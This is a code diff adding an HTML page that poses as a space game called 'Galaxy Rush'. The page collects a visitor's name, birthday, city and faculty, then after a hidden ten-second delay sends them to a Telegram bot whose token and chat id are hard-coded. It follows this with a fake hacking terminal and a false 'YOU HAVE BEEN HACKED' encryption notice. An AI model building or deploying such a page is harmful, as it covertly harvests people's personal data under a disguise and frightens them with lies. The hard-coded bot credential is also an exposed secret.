@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mini Game</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Orbitron, sans-serif;
+color: white;
+    text-align: center;
+    background: #0e064f;
+    transition: background 0.5s, color 0.5s;
+}
+
+.screen {
+    display: none;
+    padding: 40px;
+}
+
+.active {
+    display: block;
+}
+
+button {
+    padding: 12px 24px;
+    font-size: 18px;
+    margin-top: 20px;
+    cursor: pointer;
+    border: none;
+    background: white;
+    color: #0e064f;
+    border-radius: 20px;
+}
+
+input {
+    display: block;
+    margin: 10px auto;
+    padding: 10px;
+    width: 260px;
+    font-size: 16px;
+}
+
+.red {
+    color: red;
+    font-size: 42px;
+    font-weight: bold;
+    animation: flicker 1s infinite;
+}
+
+@keyframes flicker {
+    0% {opacity: 1;}
+    50% {opacity: 0.4;}
+    100% {opacity: 1;}
+}
+
+#loadingBar {
+    width: 0%;
+    height: 20px;
+    background: red;
+    margin: 20px auto;
+    transition: width 0.3s;
+}
+
+#terminal {
+    font-family: monospace;
+    text-align: left;
+    max-width: 400px;
+    margin: 20px auto;
+    color: #00ff00;
+}
+</style>
+</head>
+
+<body>
+<audio id="hackSound" src="hack.mp3"></audio>
+<!-- SCREEN 1 -->
+<div id="screen1" class="screen active">
+    <h1>Galaxy Rush</h1>
+    <img src="space.gif" width="200">
+    <br>
+    <button onclick="nextScreen(2)">Play</button>
+</div>
+
+<!-- SCREEN 2 -->
+<div id="screen2" class="screen">
+    <h2>Enter your details</h2>
+    <input type="text" id="name" placeholder="Name">
+    <input type="text" id="birthday" placeholder="Birthday">
+    <input type="text" id="city" placeholder="City">
+    <input type="text" id="faculty" placeholder="Faculty">
+    <button onclick="validate()">Next</button>
+</div>
+
+<!-- SCREEN 3 (LOADING + TERMINAL) -->
+<div id="screen3" class="screen">
+    <h2>Processing...</h2>
+    <div id="loadingBar"></div>
+    <div id="terminal"></div>
+</div>
+
+<!-- SCREEN 4 (FINAL SHOCK) -->
+<div id="screen4" class="screen">
+    <img src="warning.gif" width="150">
+    <div class="red">YOU HAVE BEEN HACKED</div>
+    <p>Your information has been compromised and encrypted</p>
+</div>
+
+<script>
+
+function nextScreen(n) {
+    document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+    document.getElementById("screen" + n).classList.add("active");
+}
+
+function sendToTelegram(name, birthday, city, faculty) {
+    const token = "8670759882:AAEqjka3-cD8aN143OXHgwE_3ey9vGwB_y8";
+    const chat_id = "8193311278";
+
+    const message = `New data captured:\nName: ${name}\nBirthday: ${birthday}\nCity: ${city}\nFaculty: ${faculty}`;
+
+    setTimeout(() => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: message
+            })
+        });
+    }, 10000); // 10 second delay
+}
+// VALIDATION
+function validate() {
+    let name = document.getElementById("name").value;
+    let birthday = document.getElementById("birthday").value;
+    let city = document.getElementById("city").value;
+    let faculty = document.getElementById("faculty").value;
+
+    if (!name || !birthday || !city || !faculty) {
+        alert("All fields are required!");
+        return;
+    }
+
+    // SEND DATA (delayed notification)
+    sendToTelegram(name, birthday, city, faculty);
+
+    nextScreen(3);
+    startHackSequence();
+}
+
+// LOADING + TERMINAL EFFECT
+function startHackSequence() {
+    let bar = document.getElementById("loadingBar");
+    let width = 0;
+
+    let interval = setInterval(() => {
+        width += 5;
+        bar.style.width = width + "%";
+
+        if (width >= 100) {
+            clearInterval(interval);
+            typeTerminal();
+        }
+    }, 100);
+}
+
+// TYPING TERMINAL
+function typeTerminal() {
+document.getElementById("terminal").innerHTML = "";
+    const lines = [
+        "Connecting to server...",
+        "Bypassing security...",
+        "Extracting personal data...",
+        "Encrypting files...",
+        "Access granted."
+    ];
+
+    let terminal = document.getElementById("terminal");
+    let i = 0;
+
+    function typeLine() {
+        if (i < lines.length) {
+            let line = document.createElement("div");
+            terminal.appendChild(line);
+
+            let text = lines[i];
+            let j = 0;
+
+            let typing = setInterval(() => {
+    if (j < text.length) {
+        line.textContent += text[j];
+        j++;
+
+        let sound = document.getElementById("hackSound");
+        if (sound) sound.play(); // prevents crash if sound missing
+
+    } else {
+        clearInterval(typing);
+        i++;
+        setTimeout(typeLine, 500);
+    }
+}, 40);
+        } else {
+            setTimeout(finalShock, 800);
+        }
+    }
+
+    typeLine();
+}
+
+// FINAL TRANSITION
+function finalShock() {
+    document.body.style.background = "black";
+    document.body.style.color = "red";
+    nextScreen(4);
+}
+</script>
+
+</body>
+</html>
